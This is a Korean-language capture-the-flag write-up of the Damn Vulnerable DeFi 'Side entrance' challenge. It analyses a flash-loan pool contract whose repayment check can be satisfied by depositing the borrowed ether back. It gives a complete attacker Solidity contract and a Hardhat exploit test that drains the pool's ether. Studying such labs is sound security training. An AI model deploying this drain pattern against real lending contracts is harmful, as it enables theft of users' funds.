https://teberr.notion.site/Damn-Vulnerable-Defi-side-entrance-3012cfae0faa4e1190c4b2e086eef827

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4f31c32-f6af-4d9d-b0ad-f637c9d522a4/%EB%AC%B8%EC%A0%9C.png)

문제 #4 - side entrance

누구나 입금하고 출금할 수 있는 간단한 대출 풀이 있습니다. 현재 이 풀에는 1000개의 이더가 있고 홍보를 위해서 이 이더를 바탕으로 공짜로 대출 서비스를 제공해주고 있습니다.

우리는 이 대출 풀에서 이더를 전부 탈취해야 합니다.

# 코드 분석 및 공격 설계

## SideEntranceLenderPool.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}
```

SideEntranceLenderPool 컨트랙트는 다음과 같은 함수들로 구성되어 있다.

1. deposit 함수
2. withdraw 함수
3. flashLoan 함수

```solidity
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
```

deposit 함수는 balances에 deposit 함수를 호출하여 이더를 보낸 msg.sender 와 보낸 이더의 양 msg.value를 매핑시킨다.

```solidity
    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }
```

withdraw 함수는 withdraw 함수를 호출한 msg.sender에 매핑된 자산을 가져온 뒤 0으로 만들고 가져온 만큼 msg.sender에게 전송한다. 즉 입금되어있던 모든 자산을 전부 출금해준다. 

```solidity
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
```

flashLoan함수는 다음과 같이 이루어진다.

1. 이 컨트랙트에 있는 이더를 balanceBefore에 저장
2. 이 컨트랙트에 있는 이더가 대출할 양 amount보다 많거나 같아야 한다.
3. IFlashLoanEtherReceiver의 인터페이스로 구현된 execute함수를 실행할 때 msg.sender에게 amount만큼 이더를 보내며 실행한다. 
4. 이 컨트랙트의 이더가 빌려주기전보다 많거나 같아야 한다. 

msg.sender는 이더를 받으며 execute 함수가 실행이 된다. 이 execute 함수에서 msg.sender에서 대출한 이더를 바탕으로 대출풀에 전부 deposit을 한다면 대출 풀에서 balances 에 매핑되어 있는 msg.sender의 자산은 대출받은 만큼 늘어나있게 된다. 

또한 컨트랙트에 이더가 입금이 된것이기 때문에 컨트랙트의 자산이 balanceBefore보다 크거나 같은 조건도 만족하게 된다. 

그럼 이를 만족하는 SideEntranceLenderPoolSol.sol컨트랙트를 작성하자 

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
interface ISideEntranceLenderPool{
    function deposit() external payable ;
    function withdraw() external ;
    function flashLoan(uint256 amount) external ;
}
contract SideEntranceLenderPoolsol{
    ISideEntranceLenderPool target;
    address payable attacker;
    constructor(address _target,address _attacker){
        target=ISideEntranceLenderPool(_target);
        attacker=payable(_attacker);
    } 
    function execute() public payable{
        target.deposit{value:msg.value}();
    }
    function attack(uint256 amount)public{
        target.withdraw();
        attacker.call{value:amount}("");
    }
    function flashLoan(uint256 amount)public{
        target.flashLoan(amount);
    }
    receive()payable external{}
}
```

1. execute 함수가 실행되면 대출 풀에 입금을 해야한다.
2. 공격은 입금했던 금액(사실은 대출 풀의 이더였지만)을 전부 출금하고 attacker 공격자의 주소로 전부 전송한다.
3. flashLoan을 실행한다. 이는 대출 풀에서 내 컨트랙트의 execute 함수를 실행하는 결과로 이어진다.

작성한 컨트랙트를 이용하여 공격을 진행하자.

# 공격

```tsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

		it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
```

공격 코드는 내가 만든 컨트랙트를 배포 후 flashLoan과 attack을 순차적으로 실행해 주면 된다. 

```tsx
    it('Exploit', async function () {
        const SolutionPoolFactory = await ethers.getContractFactory('SideEntranceLenderPoolsol',attacker);
        this.sol = await SolutionPoolFactory.deploy(this.pool.address,attacker.address);

        await this.sol.connect(attacker).flashLoan(ETHER_IN_POOL);
        await this.sol.connect(attacker).attack(ETHER_IN_POOL);
    });
```

그렇게 되면 내 컨트랙트는 대출 풀의 flashLaon을 실행하게 되고 이를 통해 내 컨트랙트의 execute 함수가 실행되며 대출 받은 이더 양(ETHER_IN_POOl)만큼 대출풀에 deposit을 하게 된다.

그리고 나서 attack을 통해 전액 출금 후 attacker의 주소로 출금 한 양 (ETHER_IN_POOL)만큼 전송하여 결과적으로 attacker가 대출 풀의 이더를 전부 탈취하게 된다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d6d00c0-8389-4f2f-aafa-b3d5490c359e/%EC%84%B1%EA%B3%B5.png)

npm run side-entrance 를 통해 공격이 성공했는지 테스트 결과를 확인해 보면 공격이 정상적으로 성공했음을 확인할 수 있다.
